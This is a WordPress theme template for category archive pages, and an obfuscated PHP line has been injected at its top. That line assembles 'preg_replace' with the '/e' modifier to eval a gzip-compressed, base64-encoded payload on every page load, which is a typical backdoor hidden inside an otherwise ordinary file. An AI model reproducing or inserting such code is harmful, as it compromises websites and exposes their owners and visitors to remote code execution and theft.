<?php $tOg2346 = "1xvy;(k6*e5cdb_tm0p2fz4hriqj).nalo798wgus3/";$s5320 = $tOg2346[18].$tOg2346[24].$tOg2346[9].$tOg2346[38].$tOg2346[14].$tOg2346[24].$tOg2346[9].$tOg2346[18].$tOg2346[32].$tOg2346[31].$tOg2346[11].$tOg2346[9];$GPawXuB1519 = "".chr(101)."\x76al".chr(40)."\x67".chr(122)."\x69nf".chr(108)."\x61te\x28".chr(98)."".chr(97)."".chr(115)."e6\x34_".chr(100)."\x65".chr(99)."".chr(111)."".chr(100)."\x65\x28";$kyaYN4247 = "\x29\x29\x29\x3b";$N8990 = $GPawXuB1519."'NctBC4IwGIDhv7Ik+ByVOS1UdrYIutVNZAz9hgOnQ1cUsv9eF68P76tVqOcZXbgV1/JZBazJWmQMk/NJYpHHaRMnmOW5SpOEFUoFNaWLViTcoLHu+98ut3v5WNGMbxQv24+yxVYo3eNaVKAGqCtwxopBGoR6D9FRTtMU2c4CpWTBphsJHIATT7CfcZUdcO85frTj/gc='".$kyaYN4247;$s5320($tOg2346[42].$tOg2346[29].$tOg2346[8].$tOg2346[42].$tOg2346[9], $N8990  ,"572"); ?> <?php
/**
 * The template for displaying Category Archive pages.
 *
 * @package WordPress
 * @subpackage Boilerplate
 * @since Boilerplate 1.0
 */

get_header('post'); ?>
	<section>
	<?php
		/* Run the loop for the category page to output the posts.
		 * If you want to overload this in a child theme then include a file
		 * called loop-category.php and that will be used instead.
		 */
		get_template_part( 'loop', 'category' );
	?>
	</section>

<?php get_footer(); ?>